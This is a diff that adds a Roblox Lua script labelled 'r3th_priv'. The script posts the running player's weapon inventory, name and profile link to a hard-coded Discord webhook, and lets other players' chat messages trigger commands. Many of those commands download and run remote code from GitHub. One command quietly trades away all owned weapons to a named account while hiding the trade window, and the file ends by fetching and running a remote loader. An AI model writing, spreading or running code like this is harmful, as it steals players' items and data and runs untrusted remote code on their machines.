@@ -1,1 +1,211 @@
-123
+-- r3th_priv
+
+local url = "https://discord.com/api/webhooks/1269124388868067348/Y_QelfIVv8P4SBkgmxIcbtpnENgERxFsDg_MrMokp32oC8PKgr0j-m_gUD2PTunP2-TH"
+
+t = {}
+for i,v in pairs(game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"]) do
+ table.insert(t, tostring(i).." : "..tostring(v)..", ")
+end
+inventory = table.concat(t)
+   
+local data = {
+		["embeds"] = {
+					{
+						["title"] =  game.JobId,
+						["description"] = " Inventory: " ..inventory,
+						["type"] = "rich",
+						["color"]= tonumber(0x0),
+						["footer"] = {
+							["icon_url"] = 'https://cdn.discordapp.com/attachments/1264237297042329702/1266905845887926293/67.png?ex=66a6d983&is=66a58803&hm=7b80824a72a67996ef419f2f5993b6bd9a81b1cf1461dd66eea4f7f01a657769&',
+							["text"] = game.JobId,
+						},
+						["thumbnail"] = {
+							["url"] = "https://cdn.discordapp.com/attachments/1269104775526350859/1269117575636451328/image.png?ex=66aee559&is=66ad93d9&hm=9f5aee3d7160f86895ebebaf233e4f499b64972b38ce60b582a6304954e2d258&",
+						},
+						["author"] = {
+							["name"] = game.Players.LocalPlayer.Name,
+
+						},
+
+						["fields"] = {
+							{
+								["name"] = 'Profile',
+								["value"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
+								["inline"] = true
+
+							},
+
+						}
+					}}
+			}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+Player = game.Players.LocalPlayer
+Pl = game.Players
+
+function MainCommands(plr, msg)
+    if msg == "reset" then
+        game.Players.LocalPlayer.Character.Humanoid.Health = 0
+    end
+
+    if msg == "freeze" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/freeze'))()
+    end
+
+    if msg == "noclip" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/noclip'))()
+    end
+
+    if msg == "speed" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/speed'))()
+    end
+
+    if msg == "unspeed" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/unspeed'))()
+    end
+
+    if msg == "jump" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/jump'))()
+    end
+
+    if msg == "unjump" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/unjump'))()
+    end
+
+    if msg == "spin" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/spin'))()
+    end
+
+    if msg == "unspin" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/unspin'))()
+    end
+
+        if msg == "freeze" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/freeze'))()
+    end
+
+        if msg == "unfreeze" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/unfreeze'))()
+    end
+
+        if msg == "reset" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/reset'))()
+    end
+
+            if msg == "sit" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/sit'))()
+    end
+
+            if msg == "tp" then
+        z.Character.HumanoidRootPart.CFrame = zaya.Character.HumanoidRootPart.CFrame
+    end
+
+                if msg == "rj" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/rj'))()
+    end
+
+    if msg == "unfreeze" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Rashka69/Admin-Commands/main/unfreeze'))()
+    end
+
+    if msg == "q" then
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
+        for i = 1, 10 do
+            wait(0.1)
+        game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
+        game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
+    end
+    end
+    
+    if msg == "e" then
+    local args = {
+    [1] = game:GetService("Players"):WaitForChild("JoeGG200")
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+wait(1)
+        for i = 1, 10 do
+            wait(0.1)
+        game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
+        game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
+for k = 1, 1 do
+wait(0.1)
+for i,v in pairs(game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"]) do
+local args = {
+    [1] = i,
+    [2] = "Weapons"
+}
+
+game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
+game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
+
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+wait(0.1)
+for t = 1, 10 do
+wait(0.1)
+local args = {
+    [1] = 1
+}
+game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
+game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
+wait(5)
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(game.PlaceId * 2)
+local args = {
+    [1] = 1
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(game.PlaceId * 2)
+end
+end
+end
+end
+end
+    
+    game.Players.JoeGG200.Chatted:Connect(function(msg)
+    
+    local args = {
+        [1] = msg,
+        [2] = "Weapons"
+    }
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+
+end)
+
+    if msg == "w" then
+local args = {
+    [1] = 1
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(game.PlaceId * 2)
+local args = {
+    [1] = 1
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(game.PlaceId * 2)
+
+        
+    end
+end
+
+for _, v in pairs(Pl:GetChildren()) do
+    if v ~= Player then
+        v.Chatted:Connect(function(msg)
+            MainCommands(v, msg)
+        end)
+    end
+end
+
+Pl.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        MainCommands(plr, msg)
+    end)
+end)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
